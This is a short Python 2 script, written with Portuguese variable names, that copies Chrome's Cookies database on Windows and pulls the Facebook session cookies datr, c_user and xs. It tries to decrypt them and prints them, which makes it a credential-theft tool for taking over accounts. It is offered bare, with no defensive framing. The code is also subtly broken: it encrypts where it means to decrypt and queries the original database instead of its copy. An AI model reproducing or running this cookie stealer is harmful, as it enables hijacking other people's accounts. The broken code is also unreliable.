import os, sqlite3, shutil, win32crypt

banco = os.getenv("LOCALAPPDATA") + \
    "\\Google\\Chrome\\User Data\\Default\\Cookies"
banco2 = banco + "2"
shutil.copyfile(banco,banco2)
conexao = sqlite3.connect(banco)
consulta = conexao.cursor()
comando = "SELECT name, encrypted_value FROM cookies WHERE host_key='.facebook.com' \
    AND (name='datr' OR name='c_user' OR name='xs')"
consulta.execute(comando)
for nome, valor in consulta.fetchall():
    valor = win32crypt.CryptProtectData(valor)
    print nome + "=" + valor[1].decode("ISO-8859-1") + "\n"


conexao.close()
os.remove(banco2)